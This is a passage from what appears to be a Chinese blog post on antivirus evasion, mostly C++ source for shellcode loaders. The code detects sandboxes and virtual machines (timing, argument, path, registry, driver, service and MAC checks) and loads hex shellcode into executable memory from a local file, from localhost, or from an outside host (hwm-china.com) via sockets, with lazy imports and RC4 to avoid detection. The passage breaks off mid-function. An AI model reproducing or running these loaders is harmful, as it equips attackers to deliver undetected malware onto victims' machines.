&lt;iostream&gt;</span><br><span class=\"line\">#include &lt;chrono&gt;</span><br><span class=\"line\">#include &lt;thread&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">bool timeSleep() &#123;</span><br><span class=\"line\">    &#x2F;&#x2F; 记录起始时间点</span><br><span class=\"line\">    auto start &#x3D; std::chrono::steady_clock::now();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 休眠 10 秒钟</span><br><span class=\"line\">    std::this_thread::sleep_for(std::chrono::seconds(10));</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 计算经过的时间</span><br><span class=\"line\">    auto end &#x3D; std::chrono::steady_clock::now() - start;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 检查是否至少休眠了 10 秒钟</span><br><span class=\"line\">    if (end &gt;&#x3D; std::chrono::seconds(10)) &#123;</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>传参检测</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char* argv[]) &#123;</span><br><span class=\"line\">    if (argc &gt;&#x3D; 3) &#123;</span><br><span class=\"line\">        if (atoi(argv[1]) + atoi(argv[2]) &#x3D;&#x3D; 12 &amp;&amp; atoi(argv[1]) * atoi(argv[2]) &#x3D;&#x3D; 35) &#123;</span><br><span class=\"line\">            LoadShellCode();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>路径检测，微步的沙箱貌似存在正则对抗，目录是在 <code>C:\\\\[A-Za-z0-9~!@#$%^&amp;*()_+=\\-,.\\/;&#39;\\[\\]\\\\|&#125;&#123;&quot;:?&gt;&lt;]&#123;7&#125;\\\\</code> 所以直接规避该路径</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">void CheckWeibu()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    char currentProcessPath[MAX_PATH + 1];</span><br><span class=\"line\">    GetModuleFileName(NULL, currentProcessPath, MAX_PATH + 1);</span><br><span class=\"line\">    string input(currentProcessPath);</span><br><span class=\"line\">    regex pattern(R&quot;(C:\\\\[A-Za-z0-9~!@#$%^&amp;*()_+&#x3D;\\-,.\\&#x2F;;&#39;\\[\\]\\\\|&#125;&#123;&quot;:?&gt;&lt;]&#123;7&#125;\\\\shellcode\\.exe)&quot;);</span><br><span class=\"line\">    smatch matches;</span><br><span class=\"line\">    &#x2F;&#x2F; 符合微步路径</span><br><span class=\"line\">    if (!strstr(currentProcessPath, &quot;Windows&quot;))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        if (regex_search(input, matches, pattern)) MessageBox(0, &quot;in weibu&quot;, &quot;Caption&quot;, MB_OK);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    cout &lt;&lt; &quot;[+]path &quot; &lt;&lt; currentProcessPath &lt;&lt; endl;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>命名管道通信</p>\n<p>暂时挖坑，<a href=\"https://drootkit.github.io/MyArticles/CyberSec/%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%94%B6%E9%9B%86.html\">免杀手法收集</a></p>\n<h2 id=\"调试-虚拟机\"><a href=\"#调试-虚拟机\" class=\"headerlink\" title=\"调试/虚拟机\"></a>调试/虚拟机</h2><p><a href=\"https://mp.weixin.qq.com/s/mBOfkXm-irfpNZ5PoIOe_w\">浅谈反沙箱、反调试技术</a>，这块简单记录下，毕竟是搞免杀的，又不是搞APT的。</p>\n<p>可能存在的进程名</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Vmtoolsd.exe</span><br><span class=\"line\">Vmwaretrat.exe</span><br><span class=\"line\">Vmwareuser.exe</span><br><span class=\"line\">Vmacthlp.exe</span><br><span class=\"line\">vboxservice.exe</span><br><span class=\"line\">vboxtray.exe</span><br></pre></td></tr></table></figure>\n\n<p>注册表</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">HKLM\\SOFTWARE\\Vmware Inc\\Vmware Tools</span><br><span class=\"line\">HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 2\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0\\Identifier</span><br><span class=\"line\">HKEY_CLASSES_ROOT\\Applications\\VMwareHostOpen.exe</span><br><span class=\"line\">HKEY_LOCAL_MACHINE\\SOFTWARE\\Oracle\\VirtualBox Guest Additions</span><br></pre></td></tr></table></figure>\n\n<p>硬盘文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\windows\\System32\\Drivers\\Vmmouse.sys</span><br><span class=\"line\">C:\\windows\\System32\\Drivers\\vmtray.dll</span><br><span class=\"line\">C:\\windows\\System32\\Drivers\\VMToolsHook.dll</span><br><span class=\"line\">C:\\windows\\System32\\Drivers\\vmmousever.dll</span><br><span class=\"line\">C:\\windows\\System32\\Drivers\\vmhgfs.dll</span><br><span class=\"line\">C:\\windows\\System32\\Drivers\\vmGuestLib.dll</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\windows\\System32\\Drivers\\VBoxMouse.sys</span><br><span class=\"line\">C:\\windows\\System32\\Drivers\\VBoxGuest.sys</span><br><span class=\"line\">C:\\windows\\System32\\Drivers\\VBoxSF.sys</span><br><span class=\"line\">C:\\windows\\System32\\Drivers\\VBoxVideo.sys</span><br><span class=\"line\">C:\\windows\\System32\\vboxdisp.dll</span><br><span class=\"line\">C:\\windows\\System32\\vboxhook.dll</span><br><span class=\"line\">C:\\windows\\System32\\vboxoglerrorspu.dll</span><br><span class=\"line\">C:\\windows\\System32\\vboxoglpassthroughspu.dll</span><br><span class=\"line\">C:\\windows\\System32\\vboxservice.exe</span><br><span class=\"line\">C:\\windows\\System32\\vboxtray.exe</span><br><span class=\"line\">C:\\windows\\System32\\VBoxControl.exe</span><br></pre></td></tr></table></figure>\n\n<p>服务</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">VMTools</span><br><span class=\"line\">Vmrawdsk</span><br><span class=\"line\">Vmusbmouse</span><br><span class=\"line\">Vmvss</span><br><span class=\"line\">Vmscsi</span><br><span class=\"line\">Vmxnet</span><br><span class=\"line\">vmx_svga</span><br><span class=\"line\">Vmware Tools</span><br></pre></td></tr></table></figure>\n\n<p>MAC前缀</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">00:05:69 (Vmware)</span><br><span class=\"line\">00:0C:29 (Vmware)</span><br><span class=\"line\">00:1C:14 (Vmware)</span><br><span class=\"line\">00:50:56 (Vmware)</span><br><span class=\"line\">08:00:27 (VirtualBox)</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"分离静态免杀\"><a href=\"#分离静态免杀\" class=\"headerlink\" title=\"分离静态免杀\"></a>分离静态免杀</h1><p>这里shellcode用的是hex类型</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">fc4883e4f0e8c00000004151415052515648...</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"本地读取\"><a href=\"#本地读取\" class=\"headerlink\" title=\"本地读取\"></a>本地读取</h2><p>本地文件读取shellcode -&gt; 分配内存 -&gt; 内存执行，肯定要搭配其他手法，比如shellcode加密、动态API调用。</p>\n<p>静态免杀版，用的 lazy_importer 项目：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &lt;fstream&gt;</span><br><span class=\"line\">#include &lt;string&gt;</span><br><span class=\"line\">#include &quot;lazy_importer.hpp&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">#pragma comment(linker,&quot;&#x2F;subsystem:\\&quot;windows\\&quot; &#x2F;entry:\\&quot;mainCRTStartup\\&quot;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char hexCharToByte(char character) &#123;</span><br><span class=\"line\">    if (character &gt;&#x3D; &#39;0&#39; &amp;&amp; character &lt;&#x3D; &#39;9&#39;) &#123;</span><br><span class=\"line\">        return character - &#39;0&#39;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if (character &gt;&#x3D; &#39;a&#39; &amp;&amp; character &lt;&#x3D; &#39;f&#39;) &#123;</span><br><span class=\"line\">        return character - &#39;a&#39; + 10;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if (character &gt;&#x3D; &#39;A&#39; &amp;&amp; character &lt;&#x3D; &#39;F&#39;) &#123;</span><br><span class=\"line\">        return character - &#39;A&#39; + 10;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void hexStringToBytes(const std::string&amp; hexString, unsigned char* byteArray, int byteArraySize) &#123;</span><br><span class=\"line\">    for (int i &#x3D; 0; i &lt; hexString.length(); i +&#x3D; 2) &#123;</span><br><span class=\"line\">        byteArray[i &#x2F; 2] &#x3D; hexCharToByte(hexString[i]) * 16 + hexCharToByte(hexString[i + 1]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() &#123;</span><br><span class=\"line\">    ifstream ifs;</span><br><span class=\"line\">    ifs.open(&quot;sss.txt&quot;, ios::in);</span><br><span class=\"line\">    if (!ifs.is_open()) &#123; cout &lt;&lt; &quot;[-]open fail&quot; &lt;&lt; endl; return -1; &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    string line;</span><br><span class=\"line\">    getline(ifs, line);</span><br><span class=\"line\">    ifs.close();</span><br><span class=\"line\"></span><br><span class=\"line\">    const size_t length &#x3D; line.length() &#x2F; 2; &#x2F;&#x2F; 字节长度</span><br><span class=\"line\">    unsigned char* buffer &#x3D; (unsigned char*)malloc(length);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 调用函数将十六进制字符串转换为字节型数组</span><br><span class=\"line\">    hexStringToBytes(line, buffer, length);</span><br><span class=\"line\">    char* exec &#x3D; (char*)LI_FN(VirtualAlloc)(nullptr, length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    memcpy(exec, buffer, length);</span><br><span class=\"line\">    ((void(*) ())exec)();</span><br><span class=\"line\"></span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>另外在测试时候，发现代码顺序竟然影响免杀效果。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240505180337646.png\" alt=\"image-20240505180337646\"></p>\n<h2 id=\"远程加载\"><a href=\"#远程加载\" class=\"headerlink\" title=\"远程加载\"></a>远程加载</h2><p>三种建立http/https的连接方法</p>\n<ol>\n<li>winnet</li>\n<li>winhttp</li>\n<li>socket</li>\n</ol>\n<p>winnet</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\">#include &lt;wininet.h&gt;</span><br><span class=\"line\">#pragma comment(lib, &quot;wininet.lib&quot;)</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &lt;fstream&gt;</span><br><span class=\"line\">#include &lt;sstream&gt;</span><br><span class=\"line\">#include &lt;vector&gt;</span><br><span class=\"line\">#include &quot;lazy_importer.hpp&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 将十六进制中的单个字符转换为相应的整数值</span><br><span class=\"line\">unsigned char hexCharToByte(char character) &#123;</span><br><span class=\"line\">    if (character &gt;&#x3D; &#39;0&#39; &amp;&amp; character &lt;&#x3D; &#39;9&#39;) &#123;</span><br><span class=\"line\">        return character - &#39;0&#39;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if (character &gt;&#x3D; &#39;a&#39; &amp;&amp; character &lt;&#x3D; &#39;f&#39;) &#123;</span><br><span class=\"line\">        return character - &#39;a&#39; + 10;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if (character &gt;&#x3D; &#39;A&#39; &amp;&amp; character &lt;&#x3D; &#39;F&#39;) &#123;</span><br><span class=\"line\">        return character - &#39;A&#39; + 10;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 将十六进制字符串转换成字节型数组</span><br><span class=\"line\">void hexStringToBytes(const std::string&amp; hexString, unsigned char* byteArray, int byteArraySize) &#123;</span><br><span class=\"line\">    for (int i &#x3D; 0; i &lt; hexString.length(); i +&#x3D; 2) &#123;</span><br><span class=\"line\">        byteArray[i &#x2F; 2] &#x3D; hexCharToByte(hexString[i]) * 16 + hexCharToByte(hexString[i + 1]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">size_t GetUrl_HexContent(LPSTR url, std::vector&lt;unsigned char&gt;&amp; buffer) &#123;</span><br><span class=\"line\">    HINTERNET hInternet, hConnect;</span><br><span class=\"line\">    DWORD bytesRead;</span><br><span class=\"line\">    DWORD bufferSize &#x3D; 0;</span><br><span class=\"line\">    DWORD contentLength &#x3D; 0;</span><br><span class=\"line\">    DWORD index &#x3D; 0;</span><br><span class=\"line\">    DWORD bufferLength &#x3D; sizeof(bufferSize);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 打开一个与互联网的连接</span><br><span class=\"line\">    hInternet &#x3D; InternetOpen(L&quot;User Agent&quot;, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);</span><br><span class=\"line\">    if (hInternet &#x3D;&#x3D; NULL) &#123;</span><br><span class=\"line\">        std::cerr &lt;&lt; &quot;InternetOpen failed. Error: &quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class=\"line\">        return 0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 打开一个URL连接</span><br><span class=\"line\">    hConnect &#x3D; InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);</span><br><span class=\"line\">    if (hConnect &#x3D;&#x3D; NULL) &#123;</span><br><span class=\"line\">        std::cerr &lt;&lt; &quot;InternetOpenUrlA failed. Error: &quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class=\"line\">        InternetCloseHandle(hInternet);</span><br><span class=\"line\">        return 0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 查询HTTP响应头中的内容长度</span><br><span class=\"line\">    HttpQueryInfo(hConnect, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &amp;contentLength, &amp;bufferLength, &amp;index);</span><br><span class=\"line\">    std::vector&lt;char&gt; hexBuffer(contentLength + 1, 0);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 读取URL返回的内容到hexBuffer中</span><br><span class=\"line\">    if (!InternetReadFile(hConnect, &amp;hexBuffer[0], contentLength, &amp;bytesRead)) &#123;</span><br><span class=\"line\">        std::cerr &lt;&lt; &quot;InternetReadFile failed. Error: &quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else if (bytesRead &gt; 0) &#123;</span><br><span class=\"line\">        hexBuffer[bytesRead] &#x3D; &#39;\\0&#39;;</span><br><span class=\"line\">        &#x2F;&#x2F; 调整buffer的大小，以便存储转换后的字节数据</span><br><span class=\"line\">        buffer.resize(bytesRead &#x2F; 2);</span><br><span class=\"line\">        &#x2F;&#x2F; 将十六进制字符串转换为字节型数组</span><br><span class=\"line\">        hexStringToBytes(&amp;hexBuffer[0], &amp;buffer[0], bytesRead &#x2F; 2);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    InternetCloseHandle(hConnect);</span><br><span class=\"line\">    InternetCloseHandle(hInternet);</span><br><span class=\"line\">    return bytesRead &#x2F; 2;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() &#123;</span><br><span class=\"line\">    LPSTR url &#x3D; (char*)&quot;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;shellcode_hex.txt&quot;; </span><br><span class=\"line\">    std::vector&lt;unsigned char&gt; buffer;</span><br><span class=\"line\">    size_t size &#x3D; GetUrl_HexContent(url, buffer);</span><br><span class=\"line\">    char* exec &#x3D; (char*)LI_FN(VirtualAlloc)(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    memcpy(exec, buffer.data(), size);</span><br><span class=\"line\">    ((void(*) ())exec)();</span><br><span class=\"line\"></span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>socket静态免杀版，同样使用 lazy_importer </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;winsock2.h&gt;</span><br><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\">#include &lt;string&gt;</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &quot;lazy_importer.hpp&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">#pragma comment(lib, &quot;ws2_32.lib&quot;)</span><br><span class=\"line\">#pragma comment(linker,&quot;&#x2F;subsystem:\\&quot;windows\\&quot; &#x2F;entry:\\&quot;mainCRTStartup\\&quot;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">char* readUrl(const char* szUrl, long&amp; fileSize)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    WSADATA wsaData;</span><br><span class=\"line\">    if (WSAStartup(MAKEWORD(2, 2), &amp;wsaData) !&#x3D; 0)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        cerr &lt;&lt; &quot;WSAStartup failed.&quot; &lt;&lt; endl;</span><br><span class=\"line\">        return nullptr;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    string server, filepath;</span><br><span class=\"line\">    size_t pos &#x3D; string(szUrl).find(&quot;:&#x2F;&#x2F;&quot;);</span><br><span class=\"line\">    if (pos !&#x3D; string::npos)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        string url &#x3D; string(szUrl).substr(pos + 3);</span><br><span class=\"line\">        pos &#x3D; url.find(&#39;&#x2F;&#39;);</span><br><span class=\"line\">        server &#x3D; url.substr(0, pos);</span><br><span class=\"line\">        filepath &#x3D; (pos !&#x3D; string::npos) ? url.substr(pos) : &quot;&#x2F;&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    SOCKET conn &#x3D; socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class=\"line\">    if (conn &#x3D;&#x3D; INVALID_SOCKET)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        WSACleanup();</span><br><span class=\"line\">        return nullptr;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    struct hostent* hp &#x3D; gethostbyname(server.c_str());</span><br><span class=\"line\">    if (hp &#x3D;&#x3D; NULL)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        closesocket(conn);</span><br><span class=\"line\">        WSACleanup();</span><br><span class=\"line\">        return nullptr;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    struct sockaddr_in serverAddr;</span><br><span class=\"line\">    memset(&amp;serverAddr, 0, sizeof(serverAddr));</span><br><span class=\"line\">    serverAddr.sin_family &#x3D; AF_INET;</span><br><span class=\"line\">    serverAddr.sin_port &#x3D; htons(80);</span><br><span class=\"line\">    memcpy(&amp;serverAddr.sin_addr, hp-&gt;h_addr, hp-&gt;h_length);</span><br><span class=\"line\"></span><br><span class=\"line\">    if (connect(conn, (struct sockaddr*)&amp;serverAddr, sizeof(serverAddr)) &#x3D;&#x3D; SOCKET_ERROR)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        closesocket(conn);</span><br><span class=\"line\">        WSACleanup();</span><br><span class=\"line\">        return nullptr;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    string getRequest &#x3D; &quot;GET &quot; + filepath + &quot; HTTP&#x2F;1.0\\r\\nHost: &quot; + server + &quot;\\r\\n\\r\\n&quot;;</span><br><span class=\"line\">    if (send(conn, getRequest.c_str(), getRequest.length(), 0) &#x3D;&#x3D; SOCKET_ERROR)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        closesocket(conn);</span><br><span class=\"line\">        WSACleanup();</span><br><span class=\"line\">        return nullptr;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    char readBuffer[512];</span><br><span class=\"line\">    string responseData;</span><br><span class=\"line\">    while (true)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        int bytesRead &#x3D; recv(conn, readBuffer, sizeof(readBuffer), 0);</span><br><span class=\"line\">        if (bytesRead &lt;&#x3D; 0)</span><br><span class=\"line\">            break;</span><br><span class=\"line\">        responseData.append(readBuffer, bytesRead);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    int headerEndPos &#x3D; responseData.find(&quot;\\r\\n\\r\\n&quot;);</span><br><span class=\"line\">    if (headerEndPos &#x3D;&#x3D; string::npos)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        closesocket(conn);</span><br><span class=\"line\">        WSACleanup();</span><br><span class=\"line\">        return nullptr;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    fileSize &#x3D; responseData.length() - headerEndPos - 4;</span><br><span class=\"line\">    char* result &#x3D; new char[fileSize + 1];</span><br><span class=\"line\">    memcpy(result, responseData.c_str() + headerEndPos + 4, fileSize);</span><br><span class=\"line\">    result[fileSize] &#x3D; &#39;\\0&#39;;</span><br><span class=\"line\"></span><br><span class=\"line\">    closesocket(conn);</span><br><span class=\"line\">    WSACleanup();</span><br><span class=\"line\">    return result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">const char* concat(const char* str1, const char* str2) &#123;</span><br><span class=\"line\">    size_t len1 &#x3D; strlen(str1);</span><br><span class=\"line\">    size_t len2 &#x3D; strlen(str2);</span><br><span class=\"line\">    size_t len_total &#x3D; len1 + len2;</span><br><span class=\"line\">    char* result &#x3D; new char[len_total + 1];</span><br><span class=\"line\">    memcpy(result, str1, len1);</span><br><span class=\"line\">    memcpy(result + len1, str2, len2);</span><br><span class=\"line\">    result[len_total] &#x3D; &#39;\\0&#39;;</span><br><span class=\"line\">    return result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char hexCharToByte(char character) &#123;</span><br><span class=\"line\">    if (character &gt;&#x3D; &#39;0&#39; &amp;&amp; character &lt;&#x3D; &#39;9&#39;) &#123;</span><br><span class=\"line\">        return character - &#39;0&#39;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if (character &gt;&#x3D; &#39;a&#39; &amp;&amp; character &lt;&#x3D; &#39;f&#39;) &#123;</span><br><span class=\"line\">        return character - &#39;a&#39; + 10;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if (character &gt;&#x3D; &#39;A&#39; &amp;&amp; character &lt;&#x3D; &#39;F&#39;) &#123;</span><br><span class=\"line\">        return character - &#39;A&#39; + 10;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void hexStringToBytes(const std::string&amp; hexString, unsigned char* byteArray, int byteArraySize) &#123;</span><br><span class=\"line\">    for (int i &#x3D; 0; i &lt; hexString.length(); i +&#x3D; 2) &#123;</span><br><span class=\"line\">        byteArray[i &#x2F; 2] &#x3D; hexCharToByte(hexString[i]) * 16 + hexCharToByte(hexString[i + 1]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    const char* str1 &#x3D; &quot;http&quot;;</span><br><span class=\"line\">    const char* str2 &#x3D; &quot;:&#x2F;&#x2F;hwm-china.com&#x2F;ssss.txt&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    const char* szUrl &#x3D; concat(str1, str2);</span><br><span class=\"line\">    long fileSize;</span><br><span class=\"line\">    string data &#x3D; readUrl(szUrl, fileSize);</span><br><span class=\"line\"></span><br><span class=\"line\">    const size_t length &#x3D; data.size() &#x2F; 2; &#x2F;&#x2F; 字节长度</span><br><span class=\"line\"></span><br><span class=\"line\">    unsigned char* exec &#x3D; (unsigned char*)LI_FN(VirtualAlloc)(nullptr, length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    &#x2F;&#x2F; 调用函数将十六进制字符串转换为字节型数组</span><br><span class=\"line\">    hexStringToBytes(data, exec, length);</span><br><span class=\"line\">    EnumFontsW(GetDC(NULL), NULL, (FONTENUMPROCW)exec, NULL);</span><br><span class=\"line\"></span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>效果：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240505214645485.png\" alt=\"image-20240505214645485\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240507110929004.png\" alt=\"image-20240507110929004\"></p>\n<h2 id=\"资源释放\"><a href=\"#资源释放\" class=\"headerlink\" title=\"资源释放\"></a>资源释放</h2><p><a href=\"https://www.cnblogs.com/mykr3/p/17905122.html\">免杀-绕过静态动态查杀 - mykr3</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/jTpAnS6MzARafKfMMdP_wA\">某0资源释放免杀</a></p>\n<p>就是往项目资源里添加东西，然后释放资源，再做个shellcode loader</p>\n<p>右键项目-&gt;添加-&gt;资源-&gt;导入-&gt;选择要导入的shellcode或者raw文件。这里用的calc的shellcode测试</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240506235315824.png\" alt=\"image-20240506235315824\"></p>\n<p>加个rc4</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;winsock2.h&gt;</span><br><span class=\"line\">#include&quot;resource.h&quot;</span><br><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &quot;lazy_importer.hpp&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">#pragma comment(linker,&quot;&#x2F;subsystem:\\&quot;windows\\&quot; &#x2F;entry:\\&quot;mainCRTStartup\\&quot;&quot;)</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">#define size_b 256</span><br><span class=\"line\">unsigned char sbox[257] &#x3D; &#123; 0 &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;初始化s表</span><br><span class=\"line\">void init_sbox(unsigned char* key) &#123;</span><br><span class=\"line\">    unsigned int i, j, k;</span><br><span class=\"line\">    int tmp;</span><br><span class=\"line\">    for (i &#x3D; 0; i &lt; size_b; i++) &#123;</span><br><span class=\"line\">        sbox[i] &#x3D; i;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    j &#x3D; k &#x3D; 0;</span><br><span class=\"line\">    for (i &#x3D; 0; i &lt; size_b; i++) &#123;</span><br><span class=\"line\">        tmp &#x3D; sbox[i];</span><br><span class=\"line\">        j &#x3D; (j + tmp + key[k]) % size_b;</span><br><span class=\"line\">        sbox[i] &#x3D; sbox[j];</span><br><span class=\"line\">        sbox[j] &#x3D; tmp;</span><br><span class=\"line\">        if (++k &gt;&#x3D; strlen((char*)key))k &#x3D; 0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;加解密函数</span><br><span class=\"line\">void enc_dec(unsigned char* key, unsigned char* data) &#123;</span><br><span class=\"line\">    int i, j, k, R, tmp;</span><br><span class=\"line\">    init_sbox(key);</span><br><span class=\"line\"></span><br><span class=\"line\">    j &#x3D; k &#x3D; 0;</span><br><span class=\"line\">    for (i &#x3D; 0; i &lt; strlen((char*)data); i++) &#123;</span><br><span class=\"line\">        j &#x3D; (j + 1) % size_b;</span><br><span class=\"line\">        k &#x3D; (k + sbox[j]) % size_b;</span><br><span class=\"line\"></span><br><span class=\"line\">        tmp &#x3D; sbox[j];</span><br><span class=\"line\">        sbox[j] &#x3D; sbox[k];</span><br><span class=\"line\">        sbox[k] &#x3D; tmp;</span><br><span class=\"line\"></span><br><span class=\"line\">        R &#x3D; sbox[(sbox[j] + sbox[k]) % size_b];</span><br><span class=\"line\"></span><br><span class=\"line\">        